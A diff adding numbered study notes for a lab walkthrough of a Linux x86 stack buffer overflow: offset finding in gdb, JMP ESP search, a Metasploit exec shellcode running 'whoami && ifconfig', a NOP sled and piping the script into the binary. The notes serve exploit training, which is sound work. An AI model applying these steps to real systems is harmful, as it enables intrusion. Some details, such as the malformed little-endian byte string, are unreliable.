@@ -577,6 +577,34 @@ https://sec.cybbh.io/public/security/latest/lessons/lesson-7-exploit_sg.html
     14. copy the value in wiremask, do run<<<$(echo "value")
     15. copy the value in the instruction pointer.
     16. go back to wiremask, paste that offset in the register value. (this should tell you the amount of characters you need to send in the script)
+    17. note the offset value, go back into script and change your buffer to that number.
+    18. create eip in your script -> eip = "B" * 4 -> print(buffer+eip)
+    19 in gdp -> run <<<$(./lin_buf.py)
+    20. quit out of GDB. reenter gdb with 'env -gdb ./func' -> then show env -> need to get rid of these environmental variables. run 'unset env COLUMNS / LINES'
+    21. run the executable again to get it to crash in order to figure out locations of ESP
+    22. enter a bunch of stuff 
+    23. then run 'info proc map' shows processes memory mapping. location of heap/stack/text of executable
+    24. the start is the startaddr right below the heap. the end is the end addr of the stack.
+    25. then in gdb run 'find /b 0xf7de1000 0xffffe000, 0xff, 0xe4'
+    0xff = hex for jump, 0xe4 is hex for esp
+    26. copy and paste a couple of those into the python script.
+    27. put em in little endian ex: 0xf7de3b59 -> "\x59\x3b\xde\f7" -> save that
+    28. open new console -> msfdb init (to initialize metasploit) -> msfconsole to run
+    29. use payload/linux/x86/exec -> show options
+    30. set CMD whoami && ifconfig -> show options again (just to verify if it works)
+    31. generate -b '\x00\' -f python (this generates byte code) 
+    32. copy the byte code -> paste it all into your python script
+    33. add a no op sled to your python script 'nop = "\x90" * 10'
+    34. change eip to the little endian of your first stack location.
+    35. change print statement to include nop and buf
+    36. then go to linops terminal and run -> ./func <<<$(./lin_buf.py)
+    
+    
+    
+    
+    
+    
+    
     
     
     
